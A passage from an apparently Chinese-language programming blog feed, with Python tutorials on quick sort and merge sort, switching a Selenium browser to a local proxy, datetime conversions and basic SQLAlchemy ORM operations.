class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    bubble_sort(lst1)</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    bubble_sort(lst2)</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    bubble_sort(lst3)</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    bubble_sort(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p>算法基本思想(分治思想):</p><ul><li>在数据集之中，找一个基准点(以下代码以最left为基准点)</li><li>以基准点为中心将数据分为左边比基准点小,右边大于等于基准点</li><li>在递归左右两边</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    快速排序</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    set() 设置可迭代对象及排序方式(大-&gt;小 or 小-&gt;大)</span></span><br><span class="line"><span class="string">    place_it() 每次选择最左边的作为参考,这个方法调用后左边的元素都小于它，右边的元素大于等于它,返回参考元素最终的位置</span></span><br><span class="line"><span class="string">    sort() 递归左右两边</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, iterable, reverse=False)</span>:</span></span><br><span class="line">        self.iterable = iterable</span><br><span class="line">        self.reverse = reverse</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">place_it</span><span class="params">(self, left, right)</span>:</span></span><br><span class="line">        chose_it = left</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            <span class="keyword">while</span> left &lt; right:</span><br><span class="line">                <span class="keyword">if</span> self.iterable[right] &lt; self.iterable[chose_it]:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> left &lt; right:</span><br><span class="line">                <span class="keyword">if</span> self.iterable[left] &gt; self.iterable[chose_it]:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            self.iterable[left], self.iterable[right] = self.iterable[right], self.iterable[left]</span><br><span class="line">        self.iterable[left], self.iterable[chose_it] = self.iterable[chose_it], self.iterable[left]</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sort</span><span class="params">(self, left, right)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> left &gt;= right:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        index = self.place_it(left, right)</span><br><span class="line">        <span class="comment"># print(self.iterable)</span></span><br><span class="line">        self.sort(left, index - <span class="number">1</span>)</span><br><span class="line">        self.sort(index + <span class="number">1</span>, right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sort(<span class="number">0</span>, len(self.iterable) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> self.reverse:</span><br><span class="line">            self.iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>, <span class="number">8</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">20</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    quick_sort = QuickSort()</span><br><span class="line"></span><br><span class="line">    quick_sort.set(lst1)</span><br><span class="line">    quick_sort.quick_sort()</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    quick_sort.set(lst2)</span><br><span class="line">    quick_sort.quick_sort()</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    quick_sort.set(lst3)</span><br><span class="line">    quick_sort.quick_sort()</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    quick_sort.set(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    quick_sort.quick_sort()</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p>算法基本思想(分治思想):</p><ul><li>归并排序首先将待排序数组或线性表分为两个有序数组或线性表</li><li>将两个有序数组或线性表合并成一个有序数组或线性表.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MergeSort</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    归并排序</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    set() 设置可迭代对象及排序方式(大-&gt;小 or 小-&gt;大)</span></span><br><span class="line"><span class="string">    merge() 将有序的两边进行合并</span></span><br><span class="line"><span class="string">    sort() 递归左右两边</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, iterable, reverse=False)</span>:</span></span><br><span class="line">        self.iterable = iterable</span><br><span class="line">        self.reverse = reverse</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(self, left, mid, right)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        合并左右两边</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        left_index = left</span><br><span class="line">        right_index = mid + <span class="number">1</span></span><br><span class="line">        left_end = mid</span><br><span class="line">        right_end = right</span><br><span class="line"></span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">while</span> left_index &lt;= left_end <span class="keyword">and</span> right_index &lt;= right_end:</span><br><span class="line">            <span class="keyword">if</span> self.iterable[left_index] &lt;= self.iterable[right_index]:</span><br><span class="line">                tmp.append(self.iterable[left_index])</span><br><span class="line">                left_index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp.append(self.iterable[right_index])</span><br><span class="line">                right_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> left_index &lt;= left_end:</span><br><span class="line">            tmp.append(self.iterable[left_index])</span><br><span class="line">            left_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> right_index &lt;= right_end:</span><br><span class="line">            tmp.append(self.iterable[right_index])</span><br><span class="line">            right_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        tmp_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(left, right + <span class="number">1</span>):</span><br><span class="line">            self.iterable[i] = tmp[tmp_index]</span><br><span class="line">            tmp_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sort</span><span class="params">(self, left, right)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> left &gt;= right:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        self.sort(left, mid)</span><br><span class="line">        self.sort(mid + <span class="number">1</span>, right)</span><br><span class="line"></span><br><span class="line">        self.merge(left, mid, right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge_sort</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sort(<span class="number">0</span>, len(self.iterable) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> self.reverse:</span><br><span class="line">            self.iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>, <span class="number">8</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">20</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    merge_sort = MergeSort()</span><br><span class="line"></span><br><span class="line">    merge_sort.set(lst1)</span><br><span class="line">    merge_sort.merge_sort()</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    merge_sort.set(lst2)</span><br><span class="line">    merge_sort.merge_sort()</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    merge_sort.set(lst3)</span><br><span class="line">    merge_sort.merge_sort()</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    merge_sort.set(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    merge_sort.merge_sort()</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><p>后面再补…</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;世界这么大,该往哪走?&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;python实现八大排序&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="算法" scheme="http://longofo.cc/categories/%E7%AE%97%E6%B3%95/"/>
    
      <category term="python" scheme="http://longofo.cc/categories/%E7%AE%97%E6%B3%95/python/"/>
    
    
      <category term="python" scheme="http://longofo.cc/tags/python/"/>
    
      <category term="算法" scheme="http://longofo.cc/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>selenium实现动态切换ip</title>
    <link href="http://longofo.cc/selenium%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E5%88%87%E6%8D%A2ip.html"/>
    <id>http://longofo.cc/selenium实现动态切换ip.html</id>
    <published>2018-07-09T11:39:50.000Z</published>
    <updated>2018-07-09T11:46:20.846Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">就算回报远少于付出,那也还是得努力,不努力真的连一点回报都没有</blockquote><blockquote><p>selenium动态切换ip</p></blockquote><a id="more"></a><h2 id="selenium切换ip"><a href="#selenium切换ip" class="headerlink" title="selenium切换ip"></a>selenium切换ip</h2><p>切换demo如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser = webdriver.Chrome()</span><br><span class="line">    browser.get(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">    print(<span class="string">'1: '</span>, browser.session_id)</span><br><span class="line">    print(<span class="string">'2: '</span>, browser.page_source)</span><br><span class="line">    print(<span class="string">'3: '</span>, browser.get_cookies())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 利用DesiredCapabilities(代理设置)参数值，重新打开一个sessionId，我看意思就相当于浏览器清空缓存后，加上代理重新访问一次url</span></span><br><span class="line">    proxy = webdriver.Proxy()</span><br><span class="line">    proxy.http_proxy = <span class="string">'127.0.0.1:1080'</span></span><br><span class="line">    <span class="comment"># 将代理设置添加到webdriver.DesiredCapabilities.PHANTOMJS中</span></span><br><span class="line">    proxy.add_to_capabilities(webdriver.DesiredCapabilities.CHROME)</span><br><span class="line">    browser.start_session(webdriver.DesiredCapabilities.CHROME)</span><br><span class="line">    browser.get(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">    print(<span class="string">'1: '</span>, browser.session_id)</span><br><span class="line">    print(<span class="string">'2: '</span>, browser.page_source)</span><br><span class="line">    print(<span class="string">'3: '</span>, browser.get_cookies())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e.args)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.quit()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;就算回报远少于付出,那也还是得努力,不努力真的连一点回报都没有&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;selenium动态切换ip&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="selenium" scheme="http://longofo.cc/categories/selenium/"/>
    
    
      <category term="selenium" scheme="http://longofo.cc/tags/selenium/"/>
    
      <category term="爬虫" scheme="http://longofo.cc/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>datetime与string、timetuple、timestamp之间的转换</title>
    <link href="http://longofo.cc/datetime%E4%B8%8Estring%E3%80%81timetuple%E3%80%81timestamp%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2.html"/>
    <id>http://longofo.cc/datetime与string、timetuple、timestamp之间的转换.html</id>
    <published>2018-07-03T06:06:26.000Z</published>
    <updated>2018-07-03T06:14:51.729Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">生命有限，请浪费在更美好的事物上。</blockquote><blockquote><p>datetime经常要与string、timestamp进行转换,记录下以前的笔记,忘记时可以翻看</p></blockquote><a id="more"></a><h2 id="datetime-lt-gt-string"><a href="#datetime-lt-gt-string" class="headerlink" title="datetime&lt;=&gt;string"></a>datetime&lt;=&gt;string</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># %Y:年 %m:月 %d:日 %H:小时 %M:分钟 % S:秒</span></span><br><span class="line"><span class="comment"># datetime-&gt;string</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime.now().strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line"><span class="string">'2018-07-03 13:49:26'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># string-&gt;datetime</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime.strptime(<span class="string">'2018-07-03 13:49:26'</span>,<span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">datetime.datetime(<span class="number">2018</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">49</span>, <span class="number">26</span>)</span><br></pre></td></tr></table></figure><h2 id="datetime-lt-gt-timetuple"><a href="#datetime-lt-gt-timetuple" class="headerlink" title="datetime&lt;=&gt;timetuple"></a>datetime&lt;=&gt;timetuple</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># datetime-&gt;timetuple</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timetuple = datetime.datetime.now().timetuple()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timetuple</span><br><span class="line">time.struct_time(tm_year=<span class="number">2018</span>, tm_mon=<span class="number">7</span>, tm_mday=<span class="number">3</span>, tm_hour=<span class="number">13</span>, tm_min=<span class="number">57</span>, tm_sec=<span class="number">1</span>, tm_wday=<span class="number">1</span>, tm_yday=<span class="number">184</span>, tm_isdst=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># timetuple-&gt;datetime</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timestamp = time.mktime(timetuple)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timestamp</span><br><span class="line"><span class="number">1530597421.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tm = datetime.datetime.fromtimestamp(timestamp)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tm</span><br><span class="line">datetime.datetime(<span class="number">2018</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">57</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="datetime-lt-gt-timestamp"><a href="#datetime-lt-gt-timestamp" class="headerlink" title="datetime&lt;=&gt;timestamp"></a>datetime&lt;=&gt;timestamp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># datetime-&gt;timestamp</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timestamp = datetime.datetime.now().timestamp()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timestamp</span><br><span class="line"><span class="number">1530597698.058432</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># timestamp-&gt;datetime</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tm = datetime.datetime.fromtimestamp(timestamp)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tm</span><br><span class="line">datetime.datetime(<span class="number">2018</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">38</span>, <span class="number">58432</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;生命有限，请浪费在更美好的事物上。&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;datetime经常要与string、timestamp进行转换,记录下以前的笔记,忘记时可以翻看&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="python" scheme="http://longofo.cc/categories/python/"/>
    
      <category term="datetime" scheme="http://longofo.cc/categories/python/datetime/"/>
    
    
      <category term="datetime" scheme="http://longofo.cc/tags/datetime/"/>
    
  </entry>
  
  <entry>
    <title>sqlaLchemy--ORM常见操作</title>
    <link href="http://longofo.cc/sqlaLchemy--ORM%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C.html"/>
    <id>http://longofo.cc/sqlaLchemy--ORM常见操作.html</id>
    <published>2018-06-28T15:30:37.000Z</published>
    <updated>2018-07-09T11:41:47.823Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">不做就别做，要做就坚持下去</blockquote><blockquote><p>记录下sqlalchemy中常用的操作，其它很多框架的ORM也是对sqlalchemy的包装，因此这些方法在框架中也是可用的<br><img src="http://p5m1dtoh7.bkt.clouddn.com/sqlaLchemy-ORM%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/sqlalchemy.jpg" alt=""></p></blockquote><a id="more"></a><h2 id="后面代码中使用的模型"><a href="#后面代码中使用的模型" class="headerlink" title="后面代码中使用的模型"></a>后面代码中使用的模型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine, Column, Integer, String, ForeignKey</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> relationship, sessionmaker</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"></span><br><span class="line">engine = create_engine(<span class="string">'mysql://root:123456@127.0.0.1:3306/test1?charset=utf8'</span>)</span><br><span class="line">Base = declarative_base()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'users'</span></span><br><span class="line"></span><br><span class="line">    id = Column(Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    name = Column(String(<span class="number">100</span>))</span><br><span class="line">    fullname = Column(String(<span class="number">100</span>))</span><br><span class="line">    password = Column(String(<span class="number">100</span>))</span><br><span class="line">addresses = relationship(<span class="string">"Address"</span>, backref=<span class="string">"user"</span>,cascade=<span class="string">"all, delete, delete-orphan"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;User(name='%s', fullname='%s', password='%s')&gt;"</span> % (</span><br><span class="line">            self.name, self.fullname, self.password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Address</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'addresses'</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    email_address = Column(String(<span class="number">100</span>), nullable=<span class="keyword">False</span>)</span><br><span class="line">    user_id = Column(Integer, ForeignKey(<span class="string">'users.id'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;Address(email_address='%s')&gt;"</span> % self.email_address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Base.metadata.create_all(engine)</span><br><span class="line">Session = sessionmaker(bind=engine)</span><br><span class="line"></span><br><span class="line">session = Session()</span><br></pre></td></tr></table></figure><h2 id="添加-更新-删除对象"><a href="#添加-更新-删除对象" class="headerlink" title="添加/更新/删除对象"></a>添加/更新/删除对象</h2><h3 id="添加对象"><a href="#添加对象" class="headerlink" title="添加对象"></a>添加对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>wu_user = User(name=<span class="string">'wu'</span>,fullname=<span class="string">'wu xxx xxxx'</span>,password=<span class="string">'abcdef'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.add(wu_user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user = session.query(User).filter_by(name=<span class="string">'wu'</span>).first()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user</span><br><span class="line">&lt;User(name=<span class="string">'wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wu_user <span class="keyword">is</span> user</span><br><span class="line"><span class="keyword">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user.name</span><br><span class="line"><span class="string">'wu'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user.fullname</span><br><span class="line"><span class="string">'wu xxx xxxx'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user.password</span><br><span class="line"><span class="string">'abcdef'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.commit()</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="更新对象"><a href="#更新对象" class="headerlink" title="更新对象"></a>更新对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>wu_user.name = <span class="string">'wu wu'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.add(wu_user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.commit()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user = session.query(User).filter_by(name=<span class="string">'wu wu'</span>).first()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user</span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 